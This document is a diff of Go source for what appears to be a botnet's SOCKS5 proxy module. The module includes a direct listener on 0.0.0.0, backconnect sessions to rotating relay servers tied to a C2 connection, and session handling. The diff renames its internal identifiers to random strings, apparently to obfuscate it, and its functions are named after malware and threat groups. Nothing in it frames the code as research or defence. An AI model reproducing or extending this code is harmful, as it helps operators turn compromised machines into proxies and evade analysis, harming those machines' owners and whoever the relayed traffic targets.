@@ -42,7 +42,7 @@ const hasSocks = true
 
 // activeRelay stores the relay address that cozyBear is currently connected to
 // so that fancyBear can open data connections to the same relay.
-// Protected by lazarusMutex.
+// Protected by yHcRqTp.
 var activeRelay string
 
 // muddywater starts a backconnect SOCKS5 session to one or more relay servers.
@@ -54,9 +54,9 @@ var activeRelay string
 //
 // Returns: error if already running or no valid addresses
 func muddywater(relays []string, c2Conn net.Conn) error {
-	lazarusMutex.Lock()
-	defer lazarusMutex.Unlock()
-	if lazarusActive {
+	yHcRqTp.Lock()
+	defer yHcRqTp.Unlock()
+	if gDnVkWb {
 		return fmt.Errorf("SOCKS backconnect already running")
 	}
 	// Validate at least one address
@@ -69,25 +69,25 @@ func muddywater(relays []string, c2Conn net.Conn) error {
 	if len(valid) == 0 {
 		return fmt.Errorf("no valid relay addresses")
 	}
-	lazarusActive = true
-	lazarusStopCh = make(chan struct{})
-	atomic.StoreInt32(&lazarusCount, 0)
+	gDnVkWb = true
+	kQvSdNw = make(chan struct{})
+	atomic.StoreInt32(&nBxFmZj, 0)
 	go cozyBear(valid)
 	return nil
 }
 
 // emotet stops the SOCKS5 proxy (both direct and backconnect modes).
 func emotet() {
-	lazarusMutex.Lock()
-	defer lazarusMutex.Unlock()
-	if lazarusActive && lazarusStopCh != nil {
-		close(lazarusStopCh)
+	yHcRqTp.Lock()
+	defer yHcRqTp.Unlock()
+	if gDnVkWb && kQvSdNw != nil {
+		close(kQvSdNw)
 	}
-	if lazarusListener != nil {
-		lazarusListener.Close()
-		lazarusListener = nil
+	if tMbGhXr != nil {
+		tMbGhXr.Close()
+		tMbGhXr = nil
 	}
-	lazarusActive = false
+	gDnVkWb = false
 	activeRelay = ""
 }
 
@@ -97,14 +97,14 @@ func emotet() {
 // Bot opens a SOCKS5 listener directly on 0.0.0.0:<port>.
 // ============================================================================
 
-// lazarusListener holds the direct-mode TCP listener (nil in backconnect mode).
-var lazarusListener net.Listener
+// tMbGhXr holds the direct-mode TCP listener (nil in backconnect mode).
+var tMbGhXr net.Listener
 
 // turmoil starts a direct SOCKS5 proxy listener on the specified port.
 func turmoil(port string, c2Conn net.Conn) error {
-	lazarusMutex.Lock()
-	defer lazarusMutex.Unlock()
-	if lazarusActive {
+	yHcRqTp.Lock()
+	defer yHcRqTp.Unlock()
+	if gDnVkWb {
 		return fmt.Errorf("SOCKS proxy already running")
 	}
 	portNum, err := strconv.Atoi(port)
@@ -115,29 +115,29 @@ func turmoil(port string, c2Conn net.Conn) error {
 	if err != nil {
 		return fmt.Errorf("failed to bind: %v", err)
 	}
-	lazarusListener = listener
-	lazarusActive = true
-	lazarusStopCh = make(chan struct{})
-	atomic.StoreInt32(&lazarusCount, 0)
+	tMbGhXr = listener
+	gDnVkWb = true
+	kQvSdNw = make(chan struct{})
+	atomic.StoreInt32(&nBxFmZj, 0)
 	guardedGo("socks-accept", func() {
 		for {
 			conn, err := listener.Accept()
 			if err != nil {
 				select {
-				case <-lazarusStopCh:
+				case <-kQvSdNw:
 					return
 				default:
 					continue
 				}
 			}
-			if atomic.LoadInt32(&lazarusCount) >= maxSessions {
+			if atomic.LoadInt32(&nBxFmZj) >= maxSessions {
 				conn.Close()
 				continue
 			}
-			atomic.AddInt32(&lazarusCount, 1)
+			atomic.AddInt32(&nBxFmZj, 1)
 			c := conn
 			guardedGo("socks-client", func() {
-				defer atomic.AddInt32(&lazarusCount, -1)
+				defer atomic.AddInt32(&nBxFmZj, -1)
 				trickbot(c)
 			})
 		}
@@ -167,7 +167,7 @@ func cozyBear(relays []string) {
 
 	for {
 		select {
-		case <-lazarusStopCh:
+		case <-kQvSdNw:
 			deoxys("cozyBear: Stop signal received, exiting")
 			return
 		default:
@@ -187,7 +187,7 @@ func cozyBear(relays []string) {
 				consecutive = 0
 				deoxys("cozyBear: All %d relays failed, backing off %v", len(shuffled), backoff)
 				select {
-				case <-lazarusStopCh:
+				case <-kQvSdNw:
 					return
 				case <-time.After(backoff):
 				}
@@ -201,7 +201,7 @@ func cozyBear(relays []string) {
 			} else {
 				// Quick retry on next relay (small jitter)
 				select {
-				case <-lazarusStopCh:
+				case <-kQvSdNw:
 					return
 				case <-time.After(time.Duration(500+rand.Intn(1500)) * time.Millisecond):
 				}
@@ -236,9 +236,9 @@ func cozyBear(relays []string) {
 		deoxys("cozyBear: Authenticated with relay %s", relayAddr)
 
 		// Store active relay so fancyBear knows where to open data connections
-		lazarusMutex.Lock()
+		yHcRqTp.Lock()
 		activeRelay = relayAddr
-		lazarusMutex.Unlock()
+		yHcRqTp.Unlock()
 
 		// Keepalive writer — sends periodic pings so relay detects us
 		keepaliveDone := make(chan struct{})
@@ -248,7 +248,7 @@ func cozyBear(relays []string) {
 			defer ticker.Stop()
 			for {
 				select {
-				case <-lazarusStopCh:
+				case <-kQvSdNw:
 					conn.Close()
 					return
 				case <-ticker.C:
@@ -273,8 +273,8 @@ func cozyBear(relays []string) {
 			line = strings.TrimSpace(line)
 			if strings.HasPrefix(line, "RELAY_NEW:") {
 				sessionID := strings.TrimPrefix(line, "RELAY_NEW:")
-				if atomic.LoadInt32(&lazarusCount) < maxSessions {
-					atomic.AddInt32(&lazarusCount, 1)
+				if atomic.LoadInt32(&nBxFmZj) < maxSessions {
+					atomic.AddInt32(&nBxFmZj, 1)
 					go fancyBear(relayAddr, sessionID)
 				}
 			}
@@ -283,16 +283,16 @@ func cozyBear(relays []string) {
 		conn.Close()
 		<-keepaliveDone
 
-		lazarusMutex.Lock()
+		yHcRqTp.Lock()
 		activeRelay = ""
-		lazarusMutex.Unlock()
+		yHcRqTp.Unlock()
 
 		// Move to next relay on disconnect
 		idx++
 		deoxys("cozyBear: Disconnected from %s, rotating to next relay", relayAddr)
 
 		select {
-		case <-lazarusStopCh:
+		case <-kQvSdNw:
 			return
 		case <-time.After(time.Duration(1000+rand.Intn(2000)) * time.Millisecond):
 		}
@@ -302,7 +302,7 @@ func cozyBear(relays []string) {
 // fancyBear opens a data connection to the relay for a single SOCKS5 session.
 // Sends the session ID, then runs the full SOCKS5 protocol (trickbot).
 func fancyBear(relayAddr, sessionID string) {
-	defer atomic.AddInt32(&lazarusCount, -1)
+	defer atomic.AddInt32(&nBxFmZj, -1)
 
 	host, port, err := scarcruft(relayAddr)
 	if err != nil {
